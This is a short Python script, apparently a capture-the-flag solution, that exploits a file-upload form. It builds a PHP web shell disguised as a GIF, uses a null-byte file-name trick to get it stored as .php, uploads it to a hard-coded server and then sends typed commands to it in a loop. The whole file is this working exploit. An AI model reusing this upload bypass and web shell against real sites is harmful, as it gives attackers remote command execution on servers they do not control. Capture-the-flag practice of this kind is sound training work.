#!/usr/bin/env python3
import requests

SITE = "http://52.59.124.14:10021/"
PAYLOAD = "GIF89a;<?php system($_GET['cmd']); ?>"

with open("revshell.php%00.gif", "wb") as file:
    file.write(PAYLOAD.encode())

file = open("revshell.php%00.gif", "rb")
r = requests.post(SITE, files={"fileToUpload": file}, data={"submit": "Upload"})

while True:
    r = requests.get(SITE + "images/revshell.php?cmd=" + input("cmd: "))
    print(r.text.replace("GIF89a;", "")) # ENO{4n_uplo4ded_f1l3_c4n_m4k3_wond3r5}